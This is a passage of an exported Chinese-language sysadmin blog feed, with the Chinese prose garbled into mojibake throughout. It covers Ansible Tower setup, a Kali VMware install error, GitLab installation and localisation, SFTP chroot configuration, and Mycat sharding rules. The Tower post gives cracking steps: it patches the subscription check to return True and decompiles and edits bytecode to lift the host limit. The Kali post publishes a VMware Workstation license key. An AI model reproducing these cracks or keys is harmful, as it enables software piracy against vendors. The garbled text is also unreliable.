ÁõÆÂΩïÁªìÊûÑÔºåÂÆâË£ÖÈùûÂ∏∏ÁÆÄÂçïÔºåËøô‰πüË¶ÅÂæóÁõä‰∫éansibleÁöÑplaybook„ÄÇ 123456789101112[root@ad0e6b9ef8d5 ansible-tower-setup-3.1.4]# lltotal 60-rw-r--r--. 1 root root 2526 Jul 10 13:59 README.md-rw-r--r--. 1 root root 129 Jul 10 13:59 backup.ymldrwxr-xr-x. 2 root root 4096 Jul 10 13:59 group_vars-rw-r--r--. 1 root root 10 Jul 25 03:03 install.retry-rw-r--r--. 1 root root 5571 Jul 10 13:59 install.yml-rw-r--r--. 1 root root 379 Jul 25 03:03 inventorydrwxr-xr-x. 2 root root 12288 Jul 10 13:59 licenses-rw-r--r--. 1 root root 944 Jul 10 13:59 restore.ymldrwxr-xr-x. 18 root root 4096 Jul 10 13:59 roles-rwxr-xr-x. 1 root root 9628 Jul 10 13:59 setup.sh ÁºñËæëinventoryÈÖçÁΩÆÊñá‰ª∂Â¶Ç‰∏ã vim inventory 123456789101112131415161718192021222324252627[tower]localhost ansible_connection=local[database][all:vars]#ansible-towerÁôªÂΩïÂØÜÁ†Åadmin_password='admin'#PostgreSQLÁõëÂê¨Âú∞ÂùÄÁ´ØÂè£pg_host='127.0.0.1'pg_port='5432'pg_database='awx'pg_username='awx'#herepg_password='awx'rabbitmq_port=5672rabbitmq_vhost=towerrabbitmq_username=tower#hererabbitmq_password='tower'rabbitmq_cookie=cookiemonster# Needs to be true for fqdns and ip addressesrabbitmq_use_long_name=false ËøêË°åÂÆâË£ÖËÑöÊú¨ 1sh setup.sh ËÑöÊú¨‰ºöËá™Âä®ÂÆâË£ÖÔºåÁÜüÊÇâÁöÑÊâßË°åplaybook‰ªªÂä°ÁïåÈù¢„ÄÇ ÂÆâË£ÖÊàêÂäü 1localhost : ok=41 changed=5 unreachable=0 failed=0 0x02ÂØºÂÖ•licenseÊñá‰ª∂Ê≥®ÊÑè‰ªé3.2.xÁâàÊú¨ÂºÄÂßãansible-towerÁ†¥Ëß£ÊñπÂºèÊõ¥ÊîπÔºåÊó†ÈúÄÁî≥ËØ∑licenseÊñá‰ª∂ Êõ¥ÊîπÊñá‰ª∂/var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/__init__.pyÁ¨¨120Ë°åÂ¶Ç‰∏ã 119 def _check_cloudforms_subscription(self):120 return True121 if os.path.isdir("/opt/rh/cfme-appliance") and os.path.isdir("/opt/rh/cfme-gemset"):122 try:123 has_rpms = subprocess.call(["rpm", "--quiet", "-q", "cfme", "cfme-appliance", "cfme-gemset"])124 if has_rpms == 0:125 return True126 except OSError:127 pass128 return False HOSTSÈôêÂà∂Á†¥Ëß£ ÂèçÊ±áÁºñ/var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/__init__.pyc 12cd /var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/; uncompyle6 __init__.pyc &gt;__init__.pyrm -f __init__.pyc __init__.pyo Êõ¥ÊîπÊñá‰ª∂ /var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/__init__.pyc Êõ¥Êîπ‰Ωé153Ë°åÂ¶Ç‰∏ã153154155#available_instances = int(attrs.get('instance_count', None) or 0)available_instances = 100000attrs['current_instances'] = current_instances ËÆøÈóÆtowerÔºöhttps://192.168.99.188/ÔºåÈªòËÆ§Áî®Êà∑Âêç‰∏∫adminÂØÜÁ†Å‰∏∫inventoryÊñá‰ª∂‰∏≠ËÆæÁΩÆÁöÑadmin_password=&#39;admin&#39; ÈáçÁÇπÊù•‰∫ÜÔºåËøôÈáå‰ºöÊèêÁ§∫ËÆ©ÈÄâÊã©licenseÊñá‰ª∂ÔºåÁî≥ËØ∑Ëøô‰∏™ÂæàÊòØÈ∫ªÁÉ¶ÔºåsoËøôÈáåÂàÜ‰∫´‰∏ãÊàëËá™Â∑±Áî≥ËØ∑‰∏ãÊù•ÁöÑlicenseÊñá‰ª∂Áõ¥Êé•ÂØºÂÖ•Â∞±ok„ÄÇ‰ªÖ‰æõÂÆûÈ™åÊµãËØï‰ΩøÁî®ÔºåËØ∑ÂãøÁî®‰∫éÂÖ∂ÂÆÉÁî®ÈÄîÔºÅ„ÄÇ 0x03 Á†¥Ëß£10‰∏™hostsÈôêÂà∂Áî≥ËØ∑ÁöÑÂÖçË¥πÁâàlicenseÊúÄÂ§öÂè™ËÉΩÊ∑ªÂä†10‰∏™‰∏ªÊú∫„ÄÇ 1HOSTS AVAILABLE 10 È¶ñÂÖà‰∏ãËΩΩpythonÂèçÁºñËØëÂ∑•ÂÖ∑ 1pip install uncompyle2 ÂèçÁºñËØëÊñá‰ª∂task_engine.pyc 123456789#Êü•ÊâæÊñá‰ª∂root@2813e2635181:~# find / -name task_engine.pyc/usr/lib/python2.7/dist-packages/awx/main/task_engine.pyccd /usr/lib/python2.7/dist-packages/awx/main/#ÂèçÁºñËØëÊñá‰ª∂uncompyle6 task_engine.pyc &gt;task_engine.py Êõ¥Êîπtask_engine.pycÊñá‰ª∂ ‰øÆÊîπÂÜÖÂÆπ available_instances = int(self.attributes[&#39;instance_count&#39;])‰∏∫available_instances = 10000ÔºåÂ§ßÁ∫¶Âú®162Ë°å Âà†Èô§task_engine.pyc task_engine.pyoÔºåÈáçÂêØtower 0x04Ëá≥Ê≠§ÂÆâË£ÖÁ†¥Ëß£ÈÉΩÂ∑≤ÂÆåÊàê„ÄÇÁÆÄÂçïÁöÑËØïÁî®‰∫Ü‰∏ãÔºåÂæàÊñπ‰æøÔºåÈÄöËøágitÊù•Ëé∑ÂèñÊõ¥Êñ∞‰ªªÂä°playbookÊñá‰ª∂ÔºåÂõæÂΩ¢ÂåñÈÖçÁΩÆplaybookÂèÇÊï∞Ôºå‰ªªÂä°ÂÆ°ËÆ°ËÆ∞ÂΩï„ÄÇÁªìÂêàansibleËøõË°å‰∏ªÊú∫ÁÆ°ÁêÜÔºåÊúçÂä°ÈÉ®ÁΩ≤ÔºåÂæàÊñπ‰æø„ÄÇÂÜô‰∫Ü‰∏™zookeeperÈõÜÁæ§ÈÉ®ÁΩ≤ÁöÑplaybook deploy_zk„ÄÇ:P TowerËøõÈò∂]]></content>
      <categories>
        <category>Ëá™Âä®ÂåñËøêÁª¥</category>
        <category>Ansible</category>
      </categories>
      <tags>
        <tag>Ansible</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Linux 2017.1 ÂÆâË£Övmware Êä•Èîô]]></title>
    <url>%2F2017%2F07%2F07%2Fkali-vmware%2F</url>
    <content type="text"><![CDATA[0x00 Èò≥ÂÖâÊôÆÁÖßÂÆòÁΩë‰∏ãËΩΩÂú∞ÂùÄÔºöVMware-Workstation for linux KeyÔºöVF5XA-FNDDJ-085GZ-4NXZ9-N20E6 0x01 ÈóÆÈ¢òÂÆâË£Ö‰∫ÜKali Linux 2017.1Ôºå ÁÜüÊÇâÁöÑËÄÅÂè∏Êú∫ÂßøÂäøÂÆâË£ÖVmware ÂÆâË£ÖÂÜÖÊ†∏Â§¥Êñá‰ª∂ 123apt-get update &amp;&amp; apt-get dist-upgradeapt-get install linux-headers-$(uname -r) ÁÑ∂ÂêéÁ´üÁÑ∂ÁøªËΩ¶‰∫Ü 12345678root@kionf:~# apt-get install linux-headers-$(uname -r)Reading package lists... DoneBuilding dependency tree Reading state information... DoneE: Unable to locate package linux-headers-4.9.0-kali3-amd64E: Couldn't find any package by glob 'linux-headers-4.9.0-kali3-amd64'E: Couldn't find any package by regex 'linux-headers-4.9.0-kali3-amd64' ÊêúÁ¥¢ÂÜÖÊ†∏Â§¥ÂÆâË£ÖÂåÖapt search linux-headers 12linux-headers-4.9.0-kali4-all-amd64/kali-rolling 4.9.30-2kali1 amd64 All header files for Linux 4.9 (meta-package) Âè™Êúâkali4Ê≤°kali3 0x02 Ëß£ÂÜ≥1234567891011apt-get install linux-headers-amd64#ÊâßË°åÂêéÈáçÂêØÊú∫Âô®rebootroot@kionf:~# uname -r# 4.9.0-kali4-amd64apt-get install linux-headers-$(uname -r) OK Ëß£ÂÜ≥]]></content>
      <categories>
        <category>ErrorNote</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[GitLab 9.2.6 ÂÆâË£ÖÂèäÊ±âÂåñ]]></title>
    <url>%2F2017%2F06%2F21%2Flinux-gitlab%2F</url>
    <content type="text"><![CDATA[GitLab ÂÆòÊñπÊñ∞Áâà(9.2.6)ÂÆâË£ÖÂèäÊ±âÂåñ 0x00 ÂÆâË£ÖGitLabÊµãËØï‰∏ªÊú∫: CentOS Linux release 7.3.1611 (Core)ÂÖ∂ÂÆÉÁ≥ªÁªüÂèÇËÄÉ: GitLabÂÆâË£Ö ÂÆâË£ÖÂíåÈÖçÁΩÆÂøÖË¶ÅÁöÑ‰æùËµñÂÖ≥Á≥ª123456789sudo yum install curl policycoreutils openssh-server openssh-clientssudo systemctl enable sshdsudo systemctl start sshdsudo yum install postfixsudo systemctl enable postfixsudo systemctl start postfixsudo firewall-cmd --permanent --add-service=httpsudo systemctl reload firewalld Ê∑ªÂä†GitLabÊúçÂä°ÂåÖÂπ∂ÂÆâË£Ö12curl -sS https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh | sudo bashsudo yum install gitlab-ce ÈÖçÁΩÆÂπ∂ÂêØÂä®GitLab123456vim +13 /etc/gitlab/gitlab.rb# ‰øÆÊîπexternal_url 'http://172.16.0.123'‰∏∫ÂÜÖÁΩëipÊàñÁªëÂÆöÁöÑÂüüÂêç# Ê≠§Â§ÑÁöÑÂú∞ÂùÄÁîüÊïàÂú®È°πÁõÆurlÂú∞ÂùÄÂ§Ñsudo gitlab-ctl reconfigure# ÂêØÂä®ÊúçÂä° Êü•Áúã123456789101112Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:9100 0.0.0.0:* LISTEN 25658/node_exporter tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN 25718/unicorn maste tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 25650/nginx: master tcp 0 0 127.0.0.1:9168 0.0.0.0:* LISTEN 25631/ruby tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1439/master tcp 0 0 0.0.0.0:8060 0.0.0.0:* LISTEN 25650/nginx: master tcp 0 0 127.0.0.1:9121 0.0.0.0:* LISTEN 25692/redis_exporte tcp 0 0 127.0.0.1:9090 0.0.0.0:* LISTEN 25678/prometheus tcp 0 0 127.0.0.1:9187 0.0.0.0:* LISTEN 25664/postgres_expo tcp6 0 0 ::1:9168 :::* LISTEN 25631/ruby tcp6 0 0 ::1:25 :::* LISTEN 1439/master ËÆøÈóÆ http://172.16.0.123 ÂàùÂßãÂåñÂØÜÁ†Å ÈªòËÆ§Áî®Êà∑Âêç‰∏∫ root 0x01 Ê±âÂåñÊü•ÁúãÂΩìÂâçGitLabÁâàÊú¨12sudo cat /opt/gitlab/embedded/service/gitlab-rails/VERSION# 9.2.6 cloneÊ±âÂåñ‰ª£Á†Å1234567mkdir -p /opt/gitlab-zh cd /opt/gitlab-zhyum -y install gitgit clone https://gitlab.com/xhang/gitlab.git ÊØîËæÉÊ±âÂåñÂàÜÊîØÂíåÂéüÂàÜÊîØÂØºÂá∫Êñá‰ª∂123456cd gitlabgit diff origin/9-2-stable 9-2-stable-zh &gt; /opt/gitlab-zh/9.2.diff# Ê≠§Â§ÑÊòØ9.2.6ÁâàÊú¨ ÂÖ∂‰ªñÁâàÊú¨Âè™ÈúÄÊõ¥ÊîπÊï∞Â≠ó ‰æãÂ¶Ç‰∏∫9.1 : # git diff origin/9-1-stable 9-1-stable-zh &gt; /opt/gitlab-zh/9.1.diff ÊâìË°•‰∏Å(9.2.diff)1234567891011cd /opt/gitlab-zhyum -y install patchgitlab-ctl stop#ÂÅúÊ≠¢gitlabpatch -d /opt/gitlab/embedded/service/gitlab-rails -p1 &lt; /opt/gitlab-zh/9.2.diffgotlab-ctl start#ÂêØÂä®gitlab 0x02 ÁÆ°ÁêÜËøêÁª¥ÁÆ°ÁêÜ1234567891011# ÂêØÂä®ÊâÄÊúâ gitlab ÁªÑ‰ª∂Ôºösudo gitlab-ctl start# ÂÅúÊ≠¢ÊâÄÊúâ gitlab ÁªÑ‰ª∂Ôºösudo gitlab-ctl stop# ÈáçÂêØÊâÄÊúâ gitlab ÁªÑ‰ª∂Ôºösudo gitlab-ctl restart# Êõ¥Êñ∞ÈÖçÁΩÆÂπ∂ÈáçÂêØsudo gitlab-ctl reconfigure Â§á‰ªΩÊÅ¢Â§çÂ§á‰ªΩ crontab ‰∏≠Ê∑ªÂä† 10 1 * * * /usr/bin/gitlab-rake gitlab:backup:create ÊÅ¢Â§ç È¶ñÂÖàËøõÂÖ•Â§á‰ªΩ gitlab ÁöÑÁõÆÂΩïÔºåËøô‰∏™ÁõÆÂΩïÊòØÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑgitlab_rails[&#39;backup_path&#39;]ÔºåÈªòËÆ§‰∏∫/var/opt/gitlab/backups„ÄÇ ÁÑ∂ÂêéÂÅúÊ≠¢ unicorn Âíå sidekiq Ôºå‰øùËØÅÊï∞ÊçÆÂ∫ìÊ≤°ÊúâÊñ∞ÁöÑËøûÊé•Ôºå‰∏ç‰ºöÊúâÂÜôÊï∞ÊçÆÊÉÖÂÜµ„ÄÇ 12345sudo gitlab-ctl stop unicorn# ok: down: unicorn: 0s, normally upsudo gitlab-ctl stop sidekiq# ok: down: sidekiq: 0s, normally up ÁÑ∂ÂêéÊÅ¢Â§çÊï∞ÊçÆÔºå1498033332‰∏∫Â§á‰ªΩÊñá‰ª∂ÁöÑÊó∂Èó¥Êà≥ 1234ls /var/opt/gitlab/backups#1498033332_2017_06_21_9.2.6_gitlab_backup.targitlab-rake gitlab:backup:restore BACKUP=1498033332 Êï∞ÊçÆÂÇ®Â≠òÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºågitlab Â∞ÜÊï∞ÊçÆÂ≠òÂÇ®Âú®/var/opt/gitlab/git-dataÁõÆÂΩï‰∏ãÔºåÂèóÈôê‰∫éÂàÜÂå∫ÊÉÖÂÜµ&amp;Êñπ‰æøÁÆ°ÁêÜÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ÜÊï∞ÊçÆËøÅÁßªÂà∞Âà´ÁöÑÁõÆÂΩï‰∏ã„ÄÇ Ê≤°ÊúâÊäïÂÖ•‰ΩøÁî®ÂèØÁõ¥Êé•Êõ¥Êîπ 1234567vim /etc/gitlab/gitlab.rb#Ê∑ªÂä†git_data_dir "/path/to/git-data"# Êõ¥Êñ∞ÈÖçÁΩÆÂπ∂ÈáçÂêØsudo gitlab-ctl reconfigure Êï∞ÊçÆËøÅÁßªÈ¶ñÂÖàÈúÄË¶ÅÊöÇÂÅúÊúçÂä°ÔºåÈÅøÂÖçÁî®Êà∑Âú®ËøÅÁßªÊúüÈó¥ËØªÂÜôÊï∞ÊçÆÔºö 1234567gitlab-ctl stoprsync -av /var/opt/gitlab/git-data/repositories /path/to/git-data/sudo gitlab-ctl startsudo gitlab-ctl reconfigure]]></content>
      <categories>
        <category>GitLab</category>
      </categories>
      <tags>
        <tag>GitLab</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Á¶ÅÁî®Áî®Êà∑SSHÁôªÈôÜÔºåSFTPÈîÅÂÆöÊåáÂÆöÁõÆÂΩïÈÖçÁΩÆËØ¶Ëß£]]></title>
    <url>%2F2017%2F05%2F17%2Flinux-sftp%2F</url>
    <content type="text"><![CDATA[SFTPÔºåÂç≥ SSH Êñá‰ª∂‰º†ËæìÂçèËÆÆÔºåÊàñËÄÖËØ¥ÊòØÂÆâÂÖ®Êñá‰ª∂‰º†ËæìÂçèËÆÆ, ÈÄöËøáSSHÁ´ØÂè£Âä†ÂØÜ‰º†Ëæì„ÄÇ‰ΩÜÊòØÔºåÁî±‰∫éËøôÁßç‰º†ËæìÊñπÂºè‰ΩøÁî®‰∫ÜÂä†ÂØÜ/Ëß£ÂØÜÊäÄÊúØÔºåÊâÄ‰ª•‰º†ËæìÊïàÁéáÊØîÊôÆÈÄöÁöÑFTPË¶Å‰ΩéÂæóÂ§ö„ÄÇSFTPÁöÑ‰ºòÂäøÂú®‰∫éSSHËΩØ‰ª∂ÂåÖ‰∏≠ÂåÖÂê´SFTPÔºàÊó†ÈúÄÈ¢ùÂ§ñÂÆâË£ÖÔºâÔºåiptablesÊó†ÈúÄÊ∑ªÂä†È¢ùÂ§ñÁ´ØÂè£ÔºåÈÖçÁΩÆÊñπ‰æø 0x00 Ê∑ªÂä†Áî®Êà∑Âú®ÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºå SFTP ‰ΩøÁî® SSH ÂçèËÆÆËøõË°åË∫´‰ªΩÈ™åËØÅÂπ∂Âª∫Á´ãÂÆâÂÖ®ËøûÊé•,ÊâÄ‰ª•Áõ¥Êé•‰ΩøÁî®ÂëΩ‰ª§Ê∑ªÂä†Ë¥¶Êà∑„ÄÇ Ê∑ªÂä†ÁªÑ1groupadd sftp ÂÜçÊ∑ªÂä†Ë¥¶Êà∑123useradd -g sftp -M -N -s /sbin/nologin user#Ê∑ªÂä†usernameÁî®Êà∑Âπ∂‰∏îÁ¶ÅÊ≠¢Ê≠§Áî®Êà∑loginÁ≥ªÁªü Êü•ËØ¢Áî®Êà∑ÊòØÂê¶Ê∑ªÂä†Âà∞ÁªÑ123[root@Centos6-8-TestEnv data]# groups useruser : sftp ËÆæÁΩÆÂØÜÁ†Å12345[root@Centos6-8-TestEnv data]# passwd userÊõ¥ÊîπÁî®Êà∑ user ÁöÑÂØÜÁ†Å „ÄÇÊñ∞ÁöÑ ÂØÜÁ†ÅÔºöÈáçÊñ∞ËæìÂÖ•Êñ∞ÁöÑ ÂØÜÁ†ÅÔºöpasswdÔºö ÊâÄÊúâÁöÑË∫´‰ªΩÈ™åËØÅ‰ª§ÁâåÂ∑≤ÁªèÊàêÂäüÊõ¥Êñ∞„ÄÇ 0x01 ‰øÆÊîπsshd_configÈÖçÁΩÆÊñá‰ª∂ÁºñËæëÈÖçÁΩÆÊñá‰ª∂Ôºö/etc/ssh/sshd_config‰øÆÊîπSubsystem sftp /usr/libexec/openssh/sftp-server‰∏∫Subsystem sftp internal-sftp ‰ª•‰∏ãÊòØÂØπsftpÁªÑÊùÉÈôêÈÖçÁΩÆ 123456789#ÂåπÈÖç sftp ÁªÑÁöÑÁî®Êà∑Match Group sftp #ÈîÅÂÆöÁöÑÁõÆÂΩï ChrootDirectory /data/test #ÊåáÂÆö‰ΩøÁî®sftpÊúçÂä°‰ΩøÁî®Á≥ªÁªüËá™Â∏¶ÁöÑinternal-sftp ForceCommand internal-sftp #Â¶ÇÊûú‰∏çÂ∏åÊúõËØ•Áî®Êà∑ËÉΩ‰ΩøÁî®Á´ØÂè£ËΩ¨ÂèëÂ∞±Âä†‰∏äÔºåÂê¶ÂàôÂà†Êéâ AllowTcpForwarding no X11Forwarding no ÊàñËÄÖÂØπuserÁî®Êà∑ÊùÉÈôêÈÖçÁΩÆ 12345678#ÂåπÈÖç user Áî®Êà∑Match User user #ChrootDirectory %u (%u‰ª£Ë°®ÂèòÈáèÁî®Êà∑Âêç) ChrootDirectory /data/test ForceCommand internal-sftp AllowTcpForwarding no PermitTunnel no X11Forwarding no ‰øÆÊîπÈîÅÂÆöÁî®Êà∑ÁõÆÂΩïÁöÑÊùÉÈôê1234#ÊâÄÊúâËÄÖËÆæÁΩÆ‰∏∫‰∫ÜrootÔºåÊâÄÊúâÁªÑËÆæÁΩÆ‰∏∫sftpchown root:sftp /data/test#ÊùÉÈôêËÆæÁΩÆ‰∏∫755ÔºåÊâÄÊúâËÄÖrootÊúâÂÜôÂÖ•ÊùÉÈôêÔºåËÄåÊâÄÊúâÁªÑsftpÊó†ÂÜôÂÖ•ÊùÉÈôêchmod -R 755 /data/test ÁõÆÂΩïÁöÑÊùÉÈôêËÆæÂÆöÊúâ‰∏§‰∏™Ë¶ÅÁÇπÔºö1„ÄÅÁî±ChrootDirectoryÊåáÂÆöÁöÑÁõÆÂΩïÂºÄÂßã‰∏ÄÁõ¥ÂæÄ‰∏äÂà∞Á≥ªÁªüÊ†πÁõÆÂΩï‰∏∫Ê≠¢ÁöÑÁõÆÂΩïÊã•ÊúâËÄÖÈÉΩÂè™ËÉΩÊòØroot2„ÄÅÁî±ChrootDirectoryÊåáÂÆöÁöÑÁõÆÂΩïÂºÄÂßã‰∏ÄÁõ¥ÂæÄ‰∏äÂà∞Á≥ªÁªüÊ†πÁõÆÂΩï‰∏∫Ê≠¢ÈÉΩ‰∏çÂèØ‰ª•ÂÖ∑ÊúâÁæ§ÁªÑÂÜôÂÖ•ÊùÉÈôêÔºàÊúÄÂ§ßÊùÉÈôê‰∏∫755Ôºâ Ê∑ªÂä†ÂèØ‰∏ä‰º†Âà†Èô§ÁõÆÂΩï1234mkdir /data/test/uploadchown user:sftp /data/test/upload#ÂÖÅËÆ∏userÁî®Êà∑ÊúâËØªÂÜôÊùÉÈôêÔºåÁæ§ÁªÑÂ§ñÁî®Êà∑Êó†ÂÜôÂÖ•ÊùÉÈôêchmod 755 /data/test/upload Ê≠§Êó∂ÁõÆÂΩïÊùÉÈôêÁªìÊûÑdrwxr-xr-x 19 root sftp 4096 9Êúà 4 17:52 /data/testtestÁõÆÂΩï‰∏ãÔºåuserÁî®Êà∑ÂèØËØª‰∏çÂèØÂÜôdrwxr-xr-x 4 user sftp 4096 9Êúà 28 12:02 /data/test/uploaduploadÁõÆÂΩï‰∏ãÔºåuserÁî®Êà∑ÂèØËøõË°åËØªÂÜôÊìç‰Ωú 12#ÈáçÂêØSSHD‰ΩøÈÖçÁΩÆÁîüÊïàservice sshd restart 0x02 ‰ΩøÁî®xftpÊµãËØïËøûÊé•]]></content>
      <categories>
        <category>SSH</category>
        <category>sftp</category>
      </categories>
      <tags>
        <tag>sftp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MycatÂàÜÁâáËßÑÂàô]]></title>
    <url>%2F2017%2F05%2F07%2Fmycat-alg%2F</url>
    <content type="text"><![CDATA[Â∏∏Áî®ÁöÑÊ†πÊçÆ‰∏ªÈîÆÊàñÈùû‰∏ªÈîÆÁöÑÂàÜÁâáËßÑÂàôÈÖçÁΩÆ 1. Êûö‰∏æÊ≥ïÔºö ÈÄöËøáÂú®ÈÖçÁΩÆÊñá‰ª∂‰∏≠ÈÖçÁΩÆÂèØËÉΩÁöÑÊûö‰∏æidÔºåËá™Â∑±ÈÖçÁΩÆÂàÜÁâáÔºå‰ΩøÁî®ËßÑÂàôÔºö 12345678910111213141516&lt;tableRule name="sharding-by-intfile"&gt; &lt;rule&gt; &lt;!--Ê†áËØÜÂ∞ÜË¶ÅÂàÜÁâáÁöÑË°®Â≠óÊÆµ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--ÂàÜÁâáÂáΩÊï∞--&gt; &lt;algorithm&gt;hash-int&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="hash-int" class="org.opencloudb.route.function.PartitionByFileMap"&gt; &lt;!--Ê†áËØÜÈÖçÁΩÆÊñá‰ª∂ÂêçÁß∞--&gt; &lt;property name="mapFile"&gt;partition-hash-int.txt&lt;/property&gt; &lt;!--typeÈªòËÆ§ÂÄº‰∏∫0Ôºå0Ë°®Á§∫IntegerÔºåÈùûÈõ∂Ë°®Á§∫String--&gt; &lt;property name="type"&gt;0&lt;/property&gt; &lt;!--ÊâÄÊúâÁöÑËäÇÁÇπÈÖçÁΩÆÈÉΩÊòØ‰ªé0ÂºÄÂßãÔºåÂèä0‰ª£Ë°®ËäÇÁÇπ1--&gt; &lt;property name="defaultNode"&gt;0&lt;/property&gt;&lt;/function&gt; partition-hash-int.txt ÈÖçÁΩÆÔºö 12310000=010010=1DEFAULT_NODE=1 defaultNode ÈªòËÆ§ËäÇÁÇπ:Â∞è‰∫é0Ë°®Á§∫‰∏çËÆæÁΩÆÈªòËÆ§ËäÇÁÇπÔºåÂ§ß‰∫éÁ≠â‰∫é0Ë°®Á§∫ËÆæÁΩÆÈªòËÆ§ËäÇÁÇπ ÈªòËÆ§ËäÇÁÇπÁöÑ‰ΩúÁî®ÔºöÊûö‰∏æÂàÜÁâáÊó∂ÔºåÂ¶ÇÊûúÁ¢∞Âà∞‰∏çËØÜÂà´ÁöÑÊûö‰∏æÂÄºÔºåÂ∞±ËÆ©ÂÆÉË∑ØÁî±Âà∞ÈªòËÆ§ËäÇÁÇπÂ¶ÇÊûú‰∏çÈÖçÁΩÆÈªòËÆ§ËäÇÁÇπÔºàdefaultNodeÂÄºÂ∞è‰∫é0Ë°®Á§∫‰∏çÈÖçÁΩÆÈªòËÆ§ËäÇÁÇπÔºâÔºåÁ¢∞Âà∞‰∏çËØÜÂà´ÁöÑÊûö‰∏æÂÄºÂ∞±‰ºöÊä•ÈîôÔºå like thisÔºöcan&#39;t find datanode for sharding column:column_name val:ffffffff 2.Âõ∫ÂÆöÂàÜÁâáhashÁÆóÊ≥ï12345678910111213141516&lt;tableRule name="rule1"&gt; &lt;rule&gt; &lt;!--Ê†áËØÜÂ∞ÜË¶ÅÂàÜÁâáÁöÑË°®Â≠óÊÆµ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--ÂàÜÁâáÂáΩÊï∞--&gt; &lt;algorithm&gt;func1&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="func1" class="org.opencloudb.route.function.PartitionByLong"&gt; &lt;!--ÂàÜÁâá‰∏™Êï∞ÂàóË°®--&gt; &lt;property name="partitionCount"&gt;2,1&lt;/property&gt; &lt;!--ÂàÜÁâáËåÉÂõ¥ÂàóË°®--&gt; &lt;property name="partitionLength"&gt;256,512&lt;/property&gt; &lt;!--ÂàÜÂå∫ÈïøÂ∫¶:ÈªòËÆ§‰∏∫ÊúÄÂ§ß2^n=1024 ,Âç≥ÊúÄÂ§ßÊîØÊåÅ1024ÂàÜÂå∫--&gt;&lt;/function&gt; Á∫¶Êùü : 123count,length‰∏§‰∏™Êï∞ÁªÑÁöÑÈïøÂ∫¶ÂøÖÈ°ªÊòØ‰∏ÄËá¥ÁöÑ„ÄÇ1024 = sum((count[i]*length[i])). countÂíålength‰∏§‰∏™ÂêëÈáèÁöÑÁÇπÁßØÊÅíÁ≠â‰∫é1024 Áî®Ê≥ï‰æãÂ≠êÔºö 123456789101112131415161718192021222324252627 Êú¨‰æãÁöÑÂàÜÂå∫Á≠ñÁï•ÔºöÂ∏åÊúõÂ∞ÜÊï∞ÊçÆÊ∞¥Âπ≥ÂàÜÊàê3‰ªΩÔºåÂâç‰∏§‰ªΩÂêÑÂç†25%ÔºåÁ¨¨‰∏â‰ªΩÂç†50%„ÄÇÔºàÊïÖÊú¨‰æãÈùûÂùáÂåÄÂàÜÂå∫Ôºâ // |&lt;---------------------1024------------------------&gt;| // |&lt;----256---&gt;|&lt;----256---&gt;|&lt;----------512----------&gt;| // | partition0 | partition1 | partition2 | // | ÂÖ±2‰ªΩ,ÊïÖcount[0]=2 | ÂÖ±1‰ªΩÔºåÊïÖcount[1]=1 | int[] count = new int[] &#123; 2, 1 &#125;; int[] length = new int[] &#123; 256, 512 &#125;; PartitionUtil pu = new PartitionUtil(count, length); // ‰∏ãÈù¢‰ª£Á†ÅÊºîÁ§∫ÂàÜÂà´‰ª•offerIdÂ≠óÊÆµÊàñmemberIdÂ≠óÊÆµÊ†πÊçÆ‰∏äËø∞ÂàÜÂå∫Á≠ñÁï•ÊãÜÂàÜÁöÑÂàÜÈÖçÁªìÊûú int DEFAULT_STR_HEAD_LEN = 8; // cobarÈªòËÆ§‰ºöÈÖçÁΩÆ‰∏∫Ê≠§ÂÄº long offerId = 12345; String memberId = "qiushuo"; // Ëã•Ê†πÊçÆofferIdÂàÜÈÖçÔºåpartNo1Â∞ÜÁ≠â‰∫é0ÔºåÂç≥ÊåâÁÖß‰∏äËø∞ÂàÜÂå∫Á≠ñÁï•ÔºåofferId‰∏∫12345Êó∂Â∞Ü‰ºöË¢´ÂàÜÈÖçÂà∞partition0‰∏≠ int partNo1 = pu.partition(offerId); // Ëã•Ê†πÊçÆmemberIdÂàÜÈÖçÔºåpartNo2Â∞ÜÁ≠â‰∫é2ÔºåÂç≥ÊåâÁÖß‰∏äËø∞ÂàÜÂå∫Á≠ñÁï•ÔºåmemberId‰∏∫qiushuoÊó∂Â∞Ü‰ºöË¢´ÂàÜÂà∞partition2‰∏≠ int partNo2 = pu.partition(memberId, 0, DEFAULT_STR_HEAD_LEN);Â¶ÇÊûúÈúÄË¶ÅÂπ≥ÂùáÂàÜÈÖçËÆæÁΩÆÔºöÂπ≥ÂùáÂàÜ‰∏∫4ÂàÜÁâáÔºåpartitionCount*partitionLength=1024&lt;function name="func1" class="org.opencloudb.route.function.PartitionByLong"&gt; &lt;property name="partitionCount"&gt;4&lt;/property&gt; &lt;property name="partitionLength"&gt;256&lt;/property&gt;&lt;/function&gt; 3.ËåÉÂõ¥Á∫¶ÂÆö123456789101112&lt;tableRule name="auto-sharding-long"&gt; &lt;rule&gt; &lt;!--Ê†áËØÜÂ∞ÜË¶ÅÂàÜÁâáÁöÑË°®Â≠óÊÆµ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--ÂàÜÁâáÂáΩÊï∞--&gt; &lt;algorithm&gt;rang-long&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name="rang-long" class="org.opencloudb.route.function.AutoPartitionByLong"&gt; &lt;!--ÈÖçÁΩÆÊñá‰ª∂Ë∑ØÂæÑ--&gt; &lt;property 